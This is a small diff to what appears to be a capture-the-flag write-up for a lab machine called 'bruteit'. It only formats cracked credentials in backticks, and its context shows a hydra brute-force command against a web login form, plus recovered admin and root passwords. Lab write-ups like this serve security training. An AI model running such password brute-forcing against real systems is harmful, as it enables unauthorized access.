@@ -53,7 +53,7 @@ $ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.151.208 http-post-for
 
 Loot:
 
-admin:xavier
+`admin:xavier`
 
 checking /admin/panel
 
@@ -149,7 +149,7 @@ football
 
 Loot:
 
-root:football
+`root:football`
 
 ```
 john@bruteit:~$ su - root
